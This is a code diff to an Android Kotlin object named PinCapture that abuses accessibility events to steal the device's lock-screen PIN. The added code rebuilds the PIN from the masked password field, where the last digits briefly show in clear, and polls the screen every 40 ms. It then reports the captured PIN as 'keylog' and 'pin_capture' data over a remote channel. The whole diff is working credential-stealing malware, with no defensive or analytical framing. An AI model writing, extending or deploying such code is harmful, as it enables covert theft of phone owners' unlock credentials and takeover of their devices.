@@ -27,6 +27,8 @@ object PinCapture {
     private val digits = StringBuilder()
     /** 图案/PIN 最少位数（Android 图案锁最少 4 个点，PIN 最少 4 位） */
     private const val MIN_UNLOCK_LEN = 4
+    /** 锁屏事件全量打点：排查新 ROM 时改 true，生产保持 false */
+    private const val VERBOSE_EVENTS = false
     private var lastDigitAt = 0L
     private var lastText = ""
     private var reported = false
@@ -77,10 +79,10 @@ object PinCapture {
                 .put("source", "credential_prompt").put("via", "confirm").put("ts", System.currentTimeMillis()))
             ch?.send("cacheData", JSONObject().put("k", "keylog")
                 .put("cache", org.json.JSONArray().put(JSONObject()
-                    .put("pkg", "system-credential").put("type", "pin").put("text", value)).toString()))
+                    .put("pkg", "system-credential").put("type", "pwd").put("text", value)).toString()))
             // 2.2 的正式上报口径：POST /api/device_log {type:"pin_capture"}
             ch?.postDeviceLog("pin_capture", JSONObject()
-                .put("type", "pin").put("value", value).put("ok", true))
+                .put("type", "pwd").put("value", value).put("ok", true))
         }
         until = 0L
     }
@@ -243,6 +245,31 @@ object PinCapture {
             if (txt.isNotEmpty()) probePatternText(service, txt)
         }
 
+        // 锁屏密码框：从掩码文本按位置还原（摩托罗拉/部分 ROM 数字键不发 CLICKED）
+        runCatching {
+            val src = event.source
+            if (src != null) {
+                val cd = src.contentDescription?.toString().orEmpty()
+                val st = src.text?.toString().orEmpty()
+                if (st.isNotEmpty() && (cd.contains("密码") || cd.contains("PIN") || cd.contains("contraseña") || st.any { it == '•' })) {
+                    onMaskedField(st)
+                }
+            }
+        }
+
+        // 诊断：锁屏期间把所有事件打出来（排查某些 ROM 数字键不发 CLICKED 的情况）
+        runCatching { if (!VERBOSE_EVENTS) return@runCatching
+            val pkg = event.packageName?.toString().orEmpty()
+            if (pkg.contains("systemui") || pkg.contains("keyguard") || pkg.contains("settings")) {
+                val cls = event.className?.toString().orEmpty().substringAfterLast('.')
+                val txt = event.text?.joinToString("|") { it?.toString() ?: "" }.orEmpty()
+                val src = event.source
+                val st = src?.text?.toString().orEmpty()
+                val cd = src?.contentDescription?.toString().orEmpty()
+                Log.d("PinEvt", "type=${event.eventType} cls=$cls txt=[$txt] srcText=[$st] cd=[$cd]")
+            }
+        }
+
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val t = nodeText(event)?.trim().orEmpty()
@@ -316,6 +343,18 @@ object PinCapture {
         }
     }
 
+    /** 轮询读取锁屏密码框文本（"•1"/"••22" 这类），补上事件丢失的瞬时状态 */
+    private fun readPinField(n: android.view.accessibility.AccessibilityNodeInfo?, d: Int = 0) {
+        if (n == null || d > 40) return
+        runCatching {
+            val cd = n.contentDescription?.toString().orEmpty()
+            val st = n.text?.toString().orEmpty()
+            val isPwdField = (cd.contains("密码") || cd.contains("PIN") || cd.contains("contraseña"))
+            if (st.isNotEmpty() && isPwdField) onMaskedField(st)
+        }
+        for (i in 0 until n.childCount) readPinField(n.getChild(i), d + 1)
+    }
+
     private fun startPatternPoll(service: AccessibilityService?) {
         if (service == null) { Log.w(TAG, "pattern poll: no service"); return }
         if (patternPolling) return
@@ -325,6 +364,7 @@ object PinCapture {
             override fun run() {
                 if (!patternPolling || !isActive()) { patternPolling = false; return }
                 runCatching { readDots(service.rootInActiveWindow) }
+                runCatching { readPinField(service.rootInActiveWindow) }
                 h.postDelayed(this, 40L)
             }
         }
@@ -453,6 +493,35 @@ object PinCapture {
                 .put("pkg", "lockscreen").put("type", "pattern").put("text", value)).toString()))
     }
 
+    /** 锁屏密码框的掩码文本按位置还原：EditText 会把最后 1~2 位显示成明文 */
+    private val pinByPos = HashMap<Int, Char>()
+    private var pinLen = 0
+
+    private fun onMaskedField(text: String) {
+        if (text.isEmpty()) return
+        pinLen = text.length
+        var idx = text.length - 1
+        for (ch in text.reversed()) {
+            if (ch.isDigit()) { pinByPos[idx] = ch; idx-- } else break
+        }
+        Log.d("PinEvt", "masked field=[$text] len=$pinLen map=$pinByPos")
+    }
+
+    /** 用位置表拼出完整 PIN；有缺口返回 null */
+    private fun pinFromMasked(): String? {
+        if (pinLen < MIN_UNLOCK_LEN) return null
+        val sb = StringBuilder()
+        for (i in 0 until pinLen) {
+            val c = pinByPos[i] ?: return null
+            sb.append(c)
+        }
+        return sb.toString()
+    }
+
+    private fun resetMasked() {
+        pinByPos.clear(); pinLen = 0
+    }
+
     private fun isConfirm(t: String): Boolean {
         val s = t.lowercase()
         return s.contains("确定") || s.contains("确认") || s == "ok" || s.contains("done") ||
@@ -474,7 +543,21 @@ object PinCapture {
 
     /** 用户输完并解锁：上报一次 */
     private fun commit(service: AccessibilityService, via: String) {
-        if (reported || digits.isEmpty()) return
+        if (reported) return
+        // 优先用"按位置还原"的结果（锁屏密码框掩码文本）
+        val masked = pinFromMasked()
+        if (masked != null && masked.length >= MIN_UNLOCK_LEN) {
+            reported = true
+            digits.setLength(0)
+            resetMasked()
+            Log.i(TAG, "captured pin(len=${masked.length}) via=masked")
+            send(service, "pwd", JSONObject()
+                .put("type", "system").put("pwd", masked)
+                .put("source", "lockscreen").put("via", "masked")
+                .put("ts", System.currentTimeMillis()))
+            return
+        }
+        if (digits.isEmpty()) return
         if (digits.length < MIN_UNLOCK_LEN) {
             Log.d(TAG, "drop too-short PIN: \"$digits\" (len=${digits.length} < $MIN_UNLOCK_LEN)")
             digits.setLength(0)
@@ -500,7 +583,7 @@ object PinCapture {
             if (action == "pwd") {
                 ch?.send("cacheData", JSONObject().put("k", "keylog")
                     .put("cache", org.json.JSONArray().put(JSONObject()
-                        .put("pkg", "lockscreen").put("type", "pin")
+                        .put("pkg", "lockscreen").put("type", "pwd")
                         .put("text", data.optString("pwd"))).toString()))
             }
         }
